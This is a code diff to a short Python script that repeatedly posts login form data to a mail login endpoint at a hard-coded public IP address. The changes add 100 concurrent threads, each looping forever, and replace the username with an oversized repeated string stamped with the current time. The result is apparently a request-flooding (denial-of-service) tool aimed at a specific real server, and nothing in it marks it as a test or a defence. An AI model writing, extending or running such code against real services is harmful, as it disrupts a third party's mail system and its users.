@@ -1,4 +1,7 @@
+from datetime import datetime
+
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 url = "http://112.124.67.183:8088/wiscom/mail/login"
 
@@ -8,7 +11,10 @@ form_data = {
     'device_type': 'web',
     'device_name': 'edge',
     'sid': '',
-    'uin': 'wiscom@wiscom.com.cn',
+    'uin': 'wiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwisc'
+           'omwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwis'
+           'comwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwisc'
+           'omwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscomwiscom@wiscom.com.cn' + str(datetime.now()),
     'domain': 'wiscom.com.cn',
     'aliastype': 'other',
     'errtemplate': 'logindomain',
@@ -35,8 +41,16 @@ form_data = {
     'sms_token': ''
 }
 
-# 发送POST请求
-while True:
-    response = requests.post(url, data=form_data)
-    # 打印响应内容
-    print(response.status_code)
+
+# 定义发送请求的函数
+def send_request(url, form_data):
+    while True:
+        response = requests.post(url, data=form_data)
+        print(response.status_code)
+
+
+# 使用ThreadPoolExecutor创建线程池
+with ThreadPoolExecutor(max_workers=100) as executor:
+    # 启动多个线程同时发送请求
+    for _ in range(100):  # 这里设置为5个线程，您可以根据需求调整
+        executor.submit(send_request, url, form_data)
